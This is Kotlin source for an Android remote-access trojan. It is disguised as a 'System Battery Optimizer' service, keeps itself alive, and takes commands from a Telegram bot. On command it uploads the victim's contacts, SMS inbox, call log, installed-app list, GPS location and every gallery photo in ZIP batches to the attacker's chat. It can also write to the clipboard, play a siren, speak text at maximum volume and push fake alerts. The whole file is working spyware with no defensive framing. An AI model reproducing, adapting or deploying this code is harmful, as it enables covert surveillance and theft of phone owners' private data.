package com.android.system.optimizer

import android.Manifest
import android.app.*
import android.content.*
import android.content.pm.PackageManager
import android.location.LocationManager
import android.media.AudioManager
import android.media.ToneGenerator
import android.net.Uri
import android.os.*
import android.provider.CallLog
import android.provider.ContactsContract
import android.speech.tts.TextToSpeech
import android.widget.Toast
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.DataOutputStream
import java.io.File
import java.io.FileInputStream
import java.net.HttpURLConnection
import java.net.NetworkInterface
import java.net.URL
import java.net.URLEncoder
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class PhantomService : Service() {

    private val botToken = "YOUR_TELEGRAM_BOT_TOKEN"
    private val chatId = "YOUR_TELEGRAM_CHAT_ID"

    private var lastUpdateId = 0
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var wakeLock: PowerManager.WakeLock? = null
    private var toneGenerator: ToneGenerator? = null

    override fun onCreate() {
        super.onCreate()
        startCamouflagedForeground()
        acquireWakeLock()
    }

    private fun startCamouflagedForeground() {
        val channelId = "battery_opt_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "System Battery Optimizer", NotificationManager.IMPORTANCE_LOW).apply { setShowBadge(false) }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
        val notif = NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Battery Optimizer")
            .setContentText("Arka plan güç tüketimi dengeleniyor...")
            .setSmallIcon(android.R.drawable.ic_lock_idle_low_battery)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
        
        try {
            if (Build.VERSION.SDK_INT >= 34) {
                val method = Service::class.java.getMethod("startForeground", Int::class.javaPrimitiveType, android.app.Notification::class.java, Int::class.javaPrimitiveType)
                method.invoke(this, 1337, notif, 1)
            } else {
                startForeground(1337, notif)
            }
        } catch (e: Exception) {
            try {
                startForeground(1337, notif)
            } catch (ex: Exception) {}
        }
    }

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Optimizer::CPU_Lock")
            wakeLock?.acquire()
        } catch (e: Exception) {}
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        serviceScope.launch {
            sendText("⚡ *SYSTEM OPTIMIZER BAĞLANDI* ⚡\nCihaz başlatıldı/Servis dirildi.\nSistem: `${Build.MANUFACTURER} ${Build.MODEL}`")
            pollUpdatesLoop()
        }
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        stopSiren(chatId)
        wakeLock?.let { if (it.isHeld) it.release() }
        serviceScope.cancel()
        
        try {
            val restartIntent = Intent(applicationContext, PhantomService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                try {
                    applicationContext.startForegroundService(restartIntent)
                } catch (e: Exception) {
                    applicationContext.startService(restartIntent)
                }
            } else {
                applicationContext.startService(restartIntent)
            }
        } catch (e: Exception) {}
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private suspend fun pollUpdatesLoop() {
        try {
            val syncUrl = URL("https://api.telegram.org/bot$botToken/getUpdates?offset=-1&limit=1")
            val conn = syncUrl.openConnection() as HttpURLConnection
            conn.connectTimeout = 10000
            conn.readTimeout = 10000
            conn.requestMethod = "GET"
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().readText()
                val json = JSONObject(body)
                if (json.optBoolean("ok")) {
                    val results = json.optJSONArray("result")
                    if (results != null && results.length() > 0) {
                        val lastUpd = results.getJSONObject(results.length() - 1)
                        lastUpdateId = lastUpd.optInt("update_id", 0)
                    }
                }
            }
        } catch (e: Exception) {}

        while (serviceScope.isActive) {
            try {
                val offsetParam = if (lastUpdateId > 0) lastUpdateId + 1 else 0
                val url = URL("https://api.telegram.org/bot$botToken/getUpdates?offset=$offsetParam&timeout=10")
                val conn = url.openConnection() as HttpURLConnection
                conn.connectTimeout = 10000
                conn.readTimeout = 20000
                conn.requestMethod = "GET"

                if (conn.responseCode == 200) {
                    val body = conn.inputStream.bufferedReader().readText()
                    val json = JSONObject(body)
                    if (json.optBoolean("ok")) {
                        val results = json.optJSONArray("result")
                        if (results != null) {
                            for (i in 0 until results.length()) {
                                val upd = results.getJSONObject(i)
                                val updId = upd.getInt("update_id")
                                if (updId > lastUpdateId) {
                                    lastUpdateId = updId
                                }

                                val msgObj = upd.optJSONObject("message")
                                    ?: upd.optJSONObject("channel_post")
                                    ?: upd.optJSONObject("edited_message")

                                if (msgObj != null) {
                                    val text = msgObj.optString("text", "").trim()
                                    val msgChat = msgObj.optJSONObject("chat")
                                    val senderChatId = msgChat?.optLong("id")?.toString() ?: chatId

                                    if (text.isNotEmpty()) {
                                        handleCommand(text, senderChatId)
                                    }
                                }
                            }
                        }
                    }
                }
            } catch (e: Exception) {}
            delay(1500)
        }
    }

    private fun handleCommand(rawText: String, targetChatId: String) {
        val parts = rawText.split(" ", limit = 2)
        val rawCmd = parts[0]
        val arg = if (parts.size > 1) parts[1] else ""
        val cleanCmd = rawCmd.lowercase().split("@")[0].trim()

        when {
            cleanCmd == "/ping" || cleanCmd == "ping" -> {
                sendText("🏓 *PONG!* System Optimizer aktif.", targetChatId)
            }
            cleanCmd == "/info" || cleanCmd == "info" -> {
                sendText(getDeviceInfo(), targetChatId)
            }
            cleanCmd == "/device" || cleanCmd == "device" -> {
                sendText(getDetailedDeviceInfo(), targetChatId)
            }
            cleanCmd == "/ag" || cleanCmd == "ag" -> {
                getNetworkInfo(targetChatId)
            }
            cleanCmd == "/location" || cleanCmd == "location" || cleanCmd == "/konum" || cleanCmd == "konum" -> {
                serviceScope.launch {
                    getLocationInfo(targetChatId)
                }
            }
            cleanCmd == "/help" || cleanCmd == "help" || cleanCmd == "/start" || cleanCmd == "start" -> {
                val helpMsg = """
                    🤖 *System Optimizer Komutları:*
                    • `/ping` - Servis durumunu kontrol et
                    • `/info` - Cihaz ve batarya bilgileri
                    • `/device` - Detaylı sistem raporu (RAM, Hafıza)
                    • `/ag` - Ağ ve IP istihbaratı
                    • `/location` - Anlık GPS konumunu al
                    • `/contacts` - Tüm rehberi TXT olarak indir
                    • `/sms` - Tüm SMS'leri TXT olarak indir
                    • `/arama` - Arama geçmişini TXT olarak indir
                    • `/gallery` - Galeri fotoğraflarını 50'li ZIP'ler halinde indir
                    • `/apps` - Yüklü uygulamaları TXT olarak indir
                    • `/pano_yaz [metin]` - Panoya metin kopyala
                    • `/konus [metin]` - Telefonda metni sesli oku
                    • `/siren_ac` / `/siren_kapat` - Siren alarmı çal/durdur
                    • `/uyari [metin]` - Ekranda bildirim göster
                """.trimIndent()
                sendText(helpMsg, targetChatId)
            }
            cleanCmd == "/contacts" || cleanCmd == "contacts" || cleanCmd == "/rehber" || cleanCmd == "rehber" -> {
                serviceScope.launch {
                    exportAndSendContacts(targetChatId)
                }
            }
            cleanCmd == "/sms" || cleanCmd == "sms" -> {
                serviceScope.launch {
                    exportAndSendSMS(targetChatId)
                }
            }
            cleanCmd == "/arama" || cleanCmd == "arama" -> {
                serviceScope.launch {
                    exportAndSendCallLog(targetChatId)
                }
            }
            cleanCmd == "/gallery" || cleanCmd == "gallery" || cleanCmd == "/fotolar" || cleanCmd == "fotolar" -> {
                serviceScope.launch {
                    exportAndSendGallery(targetChatId)
                }
            }
            cleanCmd == "/apps" || cleanCmd == "apps" || cleanCmd == "/uygulamalar" || cleanCmd == "uygulamalar" -> {
                serviceScope.launch {
                    exportAndSendInstalledApps(targetChatId)
                }
            }
            cleanCmd == "/pano_yaz" || cleanCmd == "pano_yaz" -> {
                writeToClipboard(arg, targetChatId)
            }
            cleanCmd == "/konus" || cleanCmd == "konus" -> {
                speakText(arg, targetChatId)
            }
            cleanCmd == "/siren_ac" || cleanCmd == "siren_ac" -> {
                startSiren(targetChatId)
            }
            cleanCmd == "/siren_kapat" || cleanCmd == "siren_kapat" -> {
                stopSiren(targetChatId)
            }
            cleanCmd == "/uyari" || cleanCmd == "uyari" -> {
                showToast(arg, targetChatId)
            }
            else -> {
                if (rawText.startsWith("/")) {
                    sendText("❓ Bilinmeyen komut: `$rawText`\nKomutlar için `/help` yazabilirsiniz.", targetChatId)
                }
            }
        }
    }

    private fun getDeviceInfo(): String {
        val batteryManager = getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
        val batteryLevel = batteryManager?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
        return """
            📱 *Cihaz Bilgileri:*
            • *Marka/Model:* ${Build.MANUFACTURER} ${Build.MODEL}
            • *Android:* ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})
            • *Batarya:* %$batteryLevel
            • *Paket:* $packageName
        """.trimIndent()
    }

    private fun getDetailedDeviceInfo(): String {
        try {
            val bm = getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
            val batteryPct = bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1

            val am = getSystemService(Context.ACTIVITY_SERVICE) as? ActivityManager
            val memInfo = ActivityManager.MemoryInfo()
            am?.getMemoryInfo(memInfo)
            val availableMb = memInfo.availMem / (1024 * 1024)
            val totalMb = memInfo.totalMem / (1024 * 1024)

            val statFs = android.os.StatFs(Environment.getDataDirectory().path)
            val totalGb = statFs.totalBytes / (1024 * 1024 * 1024)
            val freeGb = statFs.availableBytes / (1024 * 1024 * 1024)

            return """
                💻 *Detaylı Sistem Raporu:*
                • *Cihaz:* ${Build.MANUFACTURER} ${Build.MODEL}
                • *Android Sürümü:* ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})
                • *Batarya:* %$batteryPct
                • *RAM:* $availableMb MB boş / $totalMb MB toplam
                • *Dahili Hafıza:* $freeGb GB boş / $totalGb GB toplam
                • *Board/Hardware:* ${Build.BOARD} / ${Build.HARDWARE}
            """.trimIndent()
        } catch (e: Exception) {
            return "❌ Sistem bilgisi alınamadı: ${e.message}"
        }
    }

    private fun getNetworkInfo(targetChatId: String) {
        try {
            var localIp = "Bilinmiyor"
            val interfaces = NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val intf = interfaces.nextElement()
                val addrs = intf.inetAddresses
                while (addrs.hasMoreElements()) {
                    val addr = addrs.nextElement()
                    if (!addr.isLoopbackAddress && addr is java.net.Inet4Address) {
                        localIp = addr.hostAddress ?: ""
                        break
                    }
                }
            }

            val msg = """
                🌐 *Ağ İstihbaratı:*
                • *Yerel IP:* `$localIp`
                • *Cihaz Üretici:* ${Build.MANUFACTURER}
            """.trimIndent()
            sendText(msg, targetChatId)
        } catch (e: Exception) {
            sendText("❌ Ağ bilgisi alınamadı: ${e.message}", targetChatId)
        }
    }

    private fun getLocationInfo(targetChatId: String) {
        try {
            val locationManager = getSystemService(Context.LOCATION_SERVICE) as? LocationManager
            if (locationManager == null) {
                sendText("❌ Konum servisine erişilemedi.", targetChatId)
                return
            }

            val hasFine = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
            val hasCoarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

            if (!hasFine && !hasCoarse) {
                sendText("❌ Konum izni verilmemiş.", targetChatId)
                return
            }

            val providers = locationManager.getProviders(true)
            var bestLocation: android.location.Location? = null

            for (provider in providers) {
                val loc = locationManager.getLastKnownLocation(provider)
                if (loc != null) {
                    if (bestLocation == null || loc.time > bestLocation.time) {
                        bestLocation = loc
                    }
                }
            }

            if (bestLocation != null) {
                val lat = bestLocation.latitude
                val lon = bestLocation.longitude
                val mapsLink = "https://maps.google.com/?q=$lat,$lon"
                val msg = "📍 *Anlık Konum Bilgisi:* \n• *Enlem/Boylam:* `$lat, $lon`\n• *Google Maps:* $mapsLink"
                sendText(msg, targetChatId)
            } else {
                sendText("⚠️ Son bilinen konum bulunamadı (GPS kapalı veya sinyal yok).", targetChatId)
            }
        } catch (e: Exception) {
            sendText("❌ Konum alma hatası: ${e.message}", targetChatId)
        }
    }

    private fun exportAndSendInstalledApps(targetChatId: String) {
        try {
            val pm = packageManager
            val packages = pm.getInstalledPackages(0)
            val sb = StringBuilder()
            sb.append("========================================\n")
            sb.append("    SYSTEM OPTIMIZER - YÜKLÜ UYGULAMALAR\n")
            sb.append("========================================\n\n")

            var count = 0
            for (pkgInfo in packages) {
                count++
                val appName = pkgInfo.applicationInfo?.loadLabel(pm)?.toString() ?: "Bilinmiyor"
                val pkgName = pkgInfo.packageName ?: ""
                val versionName = pkgInfo.versionName ?: "N/A"
                sb.append("$count. $appName\n   Paket: $pkgName\n   Sürüm: $versionName\n\n")
            }

            sb.append("========================================\n")
            sb.append("Toplam Uygulama Sayısı: $count\n")
            sb.append("========================================\n")

            val file = File(cacheDir, "installed_apps.txt")
            file.writeText(sb.toString(), Charsets.UTF_8)

            sendText("⏳ $count adet yüklü uygulama listeleniyor ve TXT olarak gönderiliyor...", targetChatId)
            sendDocument(file, "📱 *Yüklü Uygulamalar Listesi* ($count Uygulama)", targetChatId)

            try { file.delete() } catch (e: Exception) {}

        } catch (e: Exception) {
            sendText("❌ Uygulama listesi alma hatası: ${e.message}", targetChatId)
        }
    }

    private fun exportAndSendContacts(targetChatId: String) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            sendText("❌ Rehber okuma izni verilmemiş.", targetChatId)
            return
        }

        try {
            val cursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                ),
                null, null, "DISPLAY_NAME ASC"
            )

            val sb = StringBuilder()
            sb.append("========================================\n")
            sb.append("    SYSTEM OPTIMIZER - TÜM REHBER DÖKÜMÜ\n")
            sb.append("========================================\n\n")

            var count = 0
            cursor?.use {
                if (it.moveToFirst()) {
                    do {
                        count++
                        val name = it.getString(0) ?: "İsimsiz"
                        val number = it.getString(1) ?: "Numara Yok"
                        sb.append(String.format("%03d. İsim: %s\n     Tel:  %s\n\n", count, name, number))
                    } while (it.moveToNext())
                }
            }

            if (count == 0) {
                sendText("📇 Rehberde kayıtlı kişi bulunamadı.", targetChatId)
                return
            }

            sb.append("========================================\n")
            sb.append("Toplam Rehberdeki Kişi Sayısı: $count\n")
            sb.append("========================================\n")

            val file = File(cacheDir, "rehber_contacts.txt")
            file.writeText(sb.toString(), Charsets.UTF_8)

            sendText("⏳ $count kişilik tüm rehber hazırlanıyor, TXT olarak gönderiliyor...", targetChatId)
            sendDocument(file, "📇 *Tüm Rehber Dökümü* ($count Kişi)", targetChatId)

            try { file.delete() } catch (e: Exception) {}

        } catch (e: Exception) {
            sendText("❌ Rehber aktarma hatası: ${e.message}", targetChatId)
        }
    }

    private fun exportAndSendSMS(targetChatId: String) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            sendText("❌ SMS okuma izni verilmemiş.", targetChatId)
            return
        }

        try {
            val cursor = contentResolver.query(
                Uri.parse("content://sms/inbox"),
                arrayOf("address", "body", "date"),
                null, null, "date DESC"
            )

            val sb = StringBuilder()
            sb.append("========================================\n")
            sb.append("    SYSTEM OPTIMIZER - TÜM SMS DÖKÜMÜ\n")
            sb.append("========================================\n\n")

            var count = 0
            val dateFormat = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault())
            cursor?.use {
                if (it.moveToFirst()) {
                    do {
                        count++
                        val address = it.getString(0) ?: "Bilinmiyor"
                        val body = it.getString(1) ?: ""
                        val dateMillis = it.getLong(2)
                        val dateStr = dateFormat.format(Date(dateMillis))

                        sb.append("[$count] Tarih: $dateStr\n")
                        sb.append("Gönderen: $address\n")
                        sb.append("Mesaj: $body\n")
                        sb.append("----------------------------------------\n\n")
                    } while (it.moveToNext())
                }
            }

            if (count == 0) {
                sendText("📩 Gelen kutusunda SMS bulunamadı.", targetChatId)
                return
            }

            sb.append("========================================\n")
            sb.append("Toplam SMS Sayısı: $count\n")
            sb.append("========================================\n")

            val file = File(cacheDir, "sms_dokumu.txt")
            file.writeText(sb.toString(), Charsets.UTF_8)

            sendText("⏳ Toplam $count adet SMS aktarılıyor...", targetChatId)
            sendDocument(file, "📩 *Tüm SMS Dökümü* ($count Mesaj)", targetChatId)

            try { file.delete() } catch (e: Exception) {}

        } catch (e: Exception) {
            sendText("❌ SMS aktarma hatası: ${e.message}", targetChatId)
        }
    }

    private fun exportAndSendCallLog(targetChatId: String) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            sendText("❌ Arama geçmişi okuma izni verilmemiş.", targetChatId)
            return
        }

        try {
            val cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
                ),
                null, null, "${CallLog.Calls.DATE} DESC"
            )

            val sb = StringBuilder()
            sb.append("========================================\n")
            sb.append("    SYSTEM OPTIMIZER - ARAMA GEÇMİŞİ\n")
            sb.append("========================================\n\n")

            var count = 0
            val dateFormat = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault())
            cursor?.use {
                if (it.moveToFirst()) {
                    do {
                        count++
                        val number = it.getString(0) ?: "Bilinmiyor"
                        val typeCode = it.getInt(1)
                        val type = when (typeCode) {
                            CallLog.Calls.INCOMING_TYPE -> "Gelen"
                            CallLog.Calls.OUTGOING_TYPE -> "Giden"
                            CallLog.Calls.MISSED_TYPE -> "Cevapsız"
                            CallLog.Calls.REJECTED_TYPE -> "Reddedilen"
                            else -> "Diğer"
                        }
                        val dateMillis = it.getLong(2)
                        val dateStr = dateFormat.format(Date(dateMillis))
                        val duration = it.getLong(3)

                        sb.append("[$count] Tür: $type\n")
                        sb.append("Numara: $number\n")
                        sb.append("Tarih: $dateStr\n")
                        sb.append("Süre: $duration saniye\n")
                        sb.append("----------------------------------------\n\n")
                    } while (it.moveToNext())
                }
            }

            if (count == 0) {
                sendText("📞 Arama geçmişi bulunamadı.", targetChatId)
                return
            }

            sb.append("========================================\n")
            sb.append("Toplam Arama Sayısı: $count\n")
            sb.append("========================================\n")

            val file = File(cacheDir, "arama_gecmisi.txt")
            file.writeText(sb.toString(), Charsets.UTF_8)

            sendText("⏳ $count adet arama geçmişi aktarılıyor...", targetChatId)
            sendDocument(file, "📞 *Arama Geçmişi Dökümü* ($count Kayıt)", targetChatId)

            try { file.delete() } catch (e: Exception) {}

        } catch (e: Exception) {
            sendText("❌ Arama geçmişi hatası: ${e.message}", targetChatId)
        }
    }

    private fun writeToClipboard(text: String, targetChatId: String) {
        try {
            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager
            val clip = ClipData.newPlainText("Copied", text)
            clipboard?.setPrimaryClip(clip)
            sendText("📋 Panoya başarıyla yazıldı: `$text`", targetChatId)
        } catch (e: Exception) {
            sendText("❌ Pano yazma hatası: ${e.message}", targetChatId)
        }
    }

    private fun speakText(text: String, targetChatId: String) {
        try {
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
            audioManager?.setStreamVolume(AudioManager.STREAM_MUSIC, audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)

            lateinit var ttsObj: TextToSpeech
            ttsObj = TextToSpeech(applicationContext) { status ->
                if (status == TextToSpeech.SUCCESS) {
                    ttsObj.language = Locale("tr", "TR")
                    ttsObj.speak(text, TextToSpeech.QUEUE_FLUSH, null, null)
                }
            }
            sendText("🗣️ Sesli okuma başlatıldı: `$text`", targetChatId)
        } catch (e: Exception) {
            sendText("❌ Sesli okuma hatası: ${e.message}", targetChatId)
        }
    }

    private fun startSiren(targetChatId: String) {
        try {
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
            audioManager?.setStreamVolume(AudioManager.STREAM_MUSIC, audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)

            toneGenerator = ToneGenerator(AudioManager.STREAM_MUSIC, 100)
            serviceScope.launch {
                try {
                    while (isActive) {
                        toneGenerator?.startTone(ToneGenerator.TONE_DTMF_S, 500)
                        delay(600)
                    }
                } catch (e: Exception) {}
            }
            sendText("🚨 Siren çalmaya başladı!", targetChatId)
        } catch (e: Exception) {
            sendText("❌ Siren hatası: ${e.message}", targetChatId)
        }
    }

    private fun stopSiren(targetChatId: String) {
        try {
            toneGenerator?.stopTone()
            toneGenerator?.release()
            toneGenerator = null
            sendText("🛑 Siren durduruldu.", targetChatId)
        } catch (e: Exception) {}
    }

    private fun showToast(text: String, targetChatId: String) {
        try {
            Handler(Looper.getMainLooper()).post {
                try {
                    Toast.makeText(applicationContext, text, Toast.LENGTH_LONG).show()
                } catch (e: Exception) {}
            }

            val channelId = "alert_channel_v2"
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(channelId, "System Alerts", NotificationManager.IMPORTANCE_HIGH).apply {
                    enableVibration(true)
                    setShowBadge(true)
                }
                notificationManager.createNotificationChannel(channel)
            }

            val notification = NotificationCompat.Builder(this, channelId)
                .setContentTitle("Sistem Uyarısı")
                .setContentText(text)
                .setStyle(NotificationCompat.BigTextStyle().bigText(text))
                .setSmallIcon(android.R.drawable.ic_dialog_alert)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setDefaults(NotificationCompat.DEFAULT_ALL)
                .setAutoCancel(true)
                .build()

            notificationManager.notify(9999, notification)

            sendText("💬 Ekranda bildirim gösterildi: `$text`", targetChatId)
        } catch (e: Exception) {
            sendText("❌ Bildirim gösterme hatası: ${e.message}", targetChatId)
        }
    }

    private fun exportAndSendGallery(targetChatId: String) {
        sendText("⏳ Tüm galeri taranıyor ve 50'li ZIP parçaları halinde hazırlanıyor...", targetChatId)
        serviceScope.launch {
            try {
                val allPhotos = mutableListOf<Triple<Long, String, Uri>>()
                val seenNames = mutableSetOf<String>()

                val projection = arrayOf(
                    android.provider.MediaStore.Images.Media._ID,
                    android.provider.MediaStore.Images.Media.DISPLAY_NAME,
                    android.provider.MediaStore.Images.Media.DATE_ADDED
                )
                val sortOrder = "${android.provider.MediaStore.Images.Media.DATE_ADDED} DESC"
                val cursor = contentResolver.query(
                    android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection,
                    null, null, sortOrder
                )

                cursor?.use {
                    val idCol = it.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media._ID)
                    val nameCol = it.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DISPLAY_NAME)

                    while (it.moveToNext()) {
                        val id = it.getLong(idCol)
                        val name = it.getString(nameCol) ?: "image_$id.jpg"
                        if (!seenNames.contains(name)) {
                            seenNames.add(name)
                            val uri = Uri.withAppendedPath(android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString())
                            allPhotos.add(Triple(id, name, uri))
                        }
                    }
                }

                if (allPhotos.isEmpty()) {
                    sendText("❌ Galeride hiç fotoğraf bulunamadı.", targetChatId)
                    return@launch
                }

                val totalPhotos = allPhotos.size
                val batchSize = 50
                val batches = allPhotos.chunked(batchSize)
                val totalParts = batches.size

                sendText("📦 Toplam $totalPhotos benzersiz fotoğraf bulundu. $totalParts parça halinde gönderiliyor...", targetChatId)

                for ((index, batch) in batches.withIndex()) {
                    val partNum = index + 1
                    val zipFile = File(cacheDir, "gallery_part_${partNum}_of_${totalParts}.zip")
                    val zos = java.util.zip.ZipOutputStream(java.io.FileOutputStream(zipFile))

                    var addedInBatch = 0
                    for (photo in batch) {
                        try {
                            val inputStream = contentResolver.openInputStream(photo.third)
                            if (inputStream != null) {
                                val entryName = "photo_${photo.first}_${photo.second}"
                                zos.putNextEntry(java.util.zip.ZipEntry(entryName))
                                val buffer = ByteArray(4096)
                                var bytesRead: Int
                                while (inputStream.read(buffer).also { bytesRead = it } != -1) {
                                    zos.write(buffer, 0, bytesRead)
                                }
                                zos.closeEntry()
                                inputStream.close()
                                addedInBatch++
                            }
                        } catch (e: Exception) {}
                    }

                    zos.finish()
                    zos.close()

                    if (addedInBatch > 0) {
                        val sizeKb = zipFile.length() / 1024
                        sendDocument(zipFile, "📸 *Galeri Arşivi* — Bölüm $partNum / $totalParts ($addedInBatch Fotoğraf, $sizeKb KB)", targetChatId)
                    }

                    try { zipFile.delete() } catch (e: Exception) {}
                    delay(1500)
                }

                sendText("✅ *Tüm galeri aktarımı tamamlandı!* Toplam $totalPhotos fotoğraf başarıyla gönderildi.", targetChatId)

            } catch (e: Exception) {
                sendText("❌ Galeri aktarım hatası: ${e.message}", targetChatId)
            }
        }
    }

    private fun sendDocument(file: File, caption: String, targetChatId: String = chatId) {
        try {
            val destChat = if (targetChatId.isNotEmpty()) targetChatId else chatId
            val boundary = "*****" + System.currentTimeMillis() + "*****"
            val url = URL("https://api.telegram.org/bot$botToken/sendDocument")
            val conn = url.openConnection() as HttpURLConnection
            conn.connectTimeout = 15000
            conn.readTimeout = 30000
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.doInput = true
            conn.useCaches = false
            conn.setRequestProperty("Connection", "Keep-Alive")
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

            val outputStream = DataOutputStream(conn.outputStream)

            outputStream.writeBytes("--$boundary\r\n")
            outputStream.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
            outputStream.writeBytes("$destChat\r\n")

            if (caption.isNotEmpty()) {
                outputStream.writeBytes("--$boundary\r\n")
                outputStream.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n")
                outputStream.write(caption.toByteArray(Charsets.UTF_8))
                outputStream.writeBytes("\r\n")
            }

            outputStream.writeBytes("--$boundary\r\n")
            outputStream.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"${file.name}\"\r\n")
            val contentType = if (file.name.endsWith(".zip")) "application/zip" else "text/plain; charset=utf-8"
            outputStream.writeBytes("Content-Type: $contentType\r\n\r\n")

            val fileInputStream = FileInputStream(file)
            val buffer = ByteArray(4096)
            var bytesRead: Int
            while (fileInputStream.read(buffer).also { bytesRead = it } != -1) {
                outputStream.write(buffer, 0, bytesRead)
            }
            fileInputStream.close()

            outputStream.writeBytes("\r\n")
            outputStream.writeBytes("--$boundary--\r\n")
            outputStream.flush()
            outputStream.close()

            val responseCode = conn.responseCode
            if (responseCode != 200) {
                val errText = conn.errorStream?.bufferedReader()?.readText() ?: ""
                sendText("⚠️ Dosya gönderilemedi (HTTP $responseCode): $errText", destChat)
            }
        } catch (e: Exception) {
            sendText("❌ Dosya gönderme hatası: ${e.message}", targetChatId)
        }
    }

    private fun sendText(msg: String, targetChatId: String = chatId) {
        try {
            val destChat = if (targetChatId.isNotEmpty()) targetChatId else chatId
            val encodedMsg = URLEncoder.encode(msg, "UTF-8")
            val urlStr = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$destChat&text=$encodedMsg&parse_mode=Markdown"
            val u = URL(urlStr)
            val c = u.openConnection() as HttpURLConnection
            c.connectTimeout = 10000
            c.readTimeout = 10000
            c.requestMethod = "GET"
            if (c.responseCode != 200) {
                val fallbackUrlStr = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$destChat&text=$encodedMsg"
                val fallbackConn = URL(fallbackUrlStr).openConnection() as HttpURLConnection
                fallbackConn.connectTimeout = 10000
                fallbackConn.readTimeout = 10000
                fallbackConn.requestMethod = "GET"
                fallbackConn.responseCode
            }
        } catch (e: Exception) {}
    }
}
